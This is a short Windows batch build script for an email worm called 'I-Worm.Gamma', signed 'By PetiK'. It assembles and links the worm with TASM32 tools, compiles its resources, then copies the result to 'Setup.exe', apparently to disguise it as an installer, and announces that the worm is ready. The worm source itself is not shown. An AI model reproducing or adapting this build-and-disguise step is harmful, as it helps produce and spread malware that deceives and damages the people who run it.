@echo off
tasm32 /M /ML Gamma
tlink32 -Tpe -aa -x Gamma,,,import32
C:\TASM32\BIN\brc32 C:\PetiK\Travaux\I-Worm.Gamma\Gamma.rc
if exist *.obj del *.obj
if exist *.map del *.map
copy Gamma.exe Setup.exe
cls
echo.
echo.
echo I-Worm.Gamma is ready.
echo.
echo By PetiK
